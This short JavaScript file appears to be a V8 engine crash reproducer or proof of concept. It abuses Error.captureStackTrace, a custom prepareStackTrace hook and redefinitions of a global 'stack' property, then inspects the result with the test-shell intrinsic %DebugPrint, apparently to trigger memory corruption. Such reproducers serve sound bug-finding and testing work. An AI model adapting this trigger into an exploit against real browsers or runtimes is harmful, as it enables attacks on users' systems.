var h0le = [Object];
function boom() {
    var h00le = h0le;
    function rGlobal() {
        h00le[0] = stack;
        return h00le;
    }
    Error.captureStackTrace(globalThis);
    function f10() {
        try { Reflect.deleteProperty(Error, "prepareStackTrace"); } catch (e) {}
        try { Reflect.deleteProperty(globalThis, "stack"); } catch (e) {}
        const v21 = { configurable: false, writable: true, enumerable: true, value: 1 };
        try { Reflect.defineProperty(globalThis, "stack", v21); } catch (e) {}
        stack = undefined;
        for (let i26 = 0; i26 < 20480; i26++) {
            try { rGlobal(); } catch (e) {}
        }
        return undefined;
    }
    Error.prepareStackTrace = f10;
    Reflect.defineProperty(globalThis, "stack", { configurable: true, writable: true, enumerable: true, value: undefined });
    delete globalThis.stack;
    try { rGlobal(); } catch (e) {}
    const v45 = %DebugPrint(h0le[0]);
}
boom();
